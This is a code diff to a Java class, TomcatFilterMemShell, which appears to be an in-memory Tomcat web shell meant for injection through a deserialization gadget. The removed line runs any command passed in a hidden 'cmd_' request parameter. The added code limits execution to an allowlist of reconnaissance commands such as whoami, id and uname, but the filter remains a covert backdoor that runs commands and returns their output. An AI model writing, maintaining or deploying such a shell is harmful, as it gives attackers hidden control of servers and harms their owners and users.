@@ -90,11 +90,23 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
 
     }
 
+    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(java.util.Arrays.asList(
+            "ls", "whoami", "date", "uptime", "uname", "id", "hostname", "pwd"
+    ));
+
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+            String trimmedCmd = cmd.trim();
+            if (!ALLOWED_COMMANDS.contains(trimmedCmd)) {
+                servletResponse.getOutputStream().write("Command not allowed.\n".getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+                return;
+            }
+            // Use array form to avoid shell interpretation; only allowlisted commands run
+            Process process = Runtime.getRuntime().exec(new String[]{trimmedCmd});
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
